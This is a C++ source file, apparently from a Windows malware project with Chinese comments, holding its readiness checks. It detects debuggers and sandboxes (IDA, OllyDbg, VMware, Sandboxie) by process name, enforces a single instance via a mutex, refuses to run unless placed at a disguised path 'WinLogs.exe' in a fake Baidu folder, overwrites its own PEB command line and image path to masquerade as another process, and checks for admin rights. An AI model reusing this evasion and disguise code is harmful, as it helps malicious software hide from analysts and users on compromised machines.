#include "pch.h"
#include "ready.h"

CHAR debug_name[5][100] = { "idaq.exe","idaq64.exe","VMwareTray.exe","SbieSvc.exe","OllyDBG.exe" };

BOOL IsAlreadyExiting() {

	HANDLE hMutex = NULL;
	hMutex = ::CreateMutexA(NULL, FALSE, "HawkNeedsToEatDinner");
	// 当函数创建成功并返回已存在互斥量对象句柄时，代表程序并非单一实例
	if (hMutex) {
		if (ERROR_ALREADY_EXISTS == ::GetLastError()) {
			OutputDebugStringA("already exiting\r\n");
			return TRUE;
		}
	}
	return FALSE;
}

BOOL find_debuger_by_name(const char* processname)
{
	for (int i = 0; i < 5; i++)
	{
		char* s = debug_name[i];
		while (*processname != '\0' && *processname == *s)
		{
			processname++;
			s++;
		}
		if (*processname == '\0' && *s == '\0') {
			return true;
		}
	}
	return FALSE;
}

BOOL IsDebug() {
	//多种反调试技术   SEH+IsDebuggerPresent+.....+全路径检测+进程遍历
	int IsSafe = 0;
	// 创建ctoolhelp对象来遍历进程快照
	CToolhelp thProcesses(TH32CS_SNAPPROCESS);
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk = thProcesses.ProcessFirst(&pe);
	for (; fOk; fOk = thProcesses.ProcessNext(&pe)) {
		if (find_debuger_by_name(pe.szExeFile)) {
			return TRUE;
		}
	}

	return false;
}

// 是否已做好准备工作
BOOL IsReady() {

	if (!IsDirCorrect()) {
		return FALSE;
	}

	if (IsDebug()) {
		return FALSE;
	}

	// 停止5秒 让新程序实例有机会自举
	Sleep(5000);

	if (IsAlreadyExiting()) {
		return FALSE;
	}

	return TRUE;
}

// 修改PEB伪装进程信息
BOOL DisguiseProcess(wchar_t* lpwszPath, wchar_t* lpwszCmd) {
	// get handle of proc
	HANDLE hProcess = ::GetCurrentProcess();

	// prepare for getting PEB
	typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL;
	PROCESS_BASIC_INFORMATION pbi = { 0 };
	PEB peb = { 0 };
	RTL_USER_PROCESS_PARAMETERS Param = { 0 };
	USHORT usCmdLen = 0;
	USHORT usPathLen = 0;
	// get addr of NtQueryInformationProcess
	NtQueryInformationProcess = (typedef_NtQueryInformationProcess)::GetProcAddress(
		::LoadLibrary("ntdll.dll"), "NtQueryInformationProcess");
	if (NULL == NtQueryInformationProcess)
	{
		OutputDebugStringA("GetProcAddress failed\r\n");
		return FALSE;
	}
	// get status of specific proc
	NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
	if (!NT_SUCCESS(status))
	{
		OutputDebugStringA("NtQueryInformationProcess failed\r\n");
		return FALSE;
	}

	// get PebBaseAddress in PROCESS_BASIC_INFORMATION of proc
	::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
	// get ProcessParameters in PEB of proc
	::ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), NULL);

	// modify cmdline data
	usCmdLen = 2 + 2 * ::wcslen(lpwszCmd); // cal lenth of unicode str
	::WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL);
	::WriteProcessMemory(hProcess, &Param.CommandLine.Length, &usCmdLen, sizeof(usCmdLen), NULL);
	// modify path data
	usPathLen = 2 + 2 * ::wcslen(lpwszPath); // cal lenth of unicode str
	::WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL);
	::WriteProcessMemory(hProcess, &Param.ImagePathName.Length, &usPathLen, sizeof(usPathLen), NULL);

	return TRUE;
}

BOOL IsDirCorrect() {
	CHAR szDir[MAX_PATH];
	CHAR szCorDir[] = "C:\\BaiduNetDisk\\WinLogs.exe";
	GetModuleFileNameA(NULL, szDir, MAX_PATH);
	if (lstrcmpiA(szDir, szCorDir)) {
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}

BOOL IsRunasAdmin()
{
	BOOL bElevated = FALSE;
	HANDLE hToken = NULL;

	// Get current process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		return FALSE;

	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;

	// Retrieve token elevation information
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen))
	{
		if (dwRetLen == sizeof(tokenEle))
		{
			bElevated = tokenEle.TokenIsElevated;
		}
	}

	CloseHandle(hToken);
	return bElevated;
}
